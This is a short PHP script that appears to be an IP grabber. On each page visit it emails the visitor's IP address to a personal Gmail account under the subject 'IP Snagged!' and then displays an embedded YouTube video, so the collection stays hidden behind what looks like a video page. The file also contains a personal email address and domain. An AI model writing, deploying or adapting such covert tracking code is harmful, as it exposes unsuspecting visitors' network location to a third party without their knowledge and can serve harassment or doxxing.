<?php
if ($_SERVER["REQUEST_METHOD"] === "GET") {
    // Replace with your email information
    $recipient = "waynekenneyjr@gmail.com";
    $subject = "IP Snagged! By Wayne.cool!";
    $message = 'IP Address - '.$_SERVER['REMOTE_ADDR'];  


    // Email headers
    $headers = "From: wayne@wayne.cool\r\n";
    $headers .= "Reply-To: webmaster@wayne.cool\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // Send email
    if (mail($recipient, $subject, $message, $headers)) {
        echo '<iframe width="560" height="315" src="https://www.youtube.com/embed/LolO4chfjTU?si=QTBpPM9iQVXAioFi" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>';
    } else {
        echo "An error occurred!";
    }
}
?>
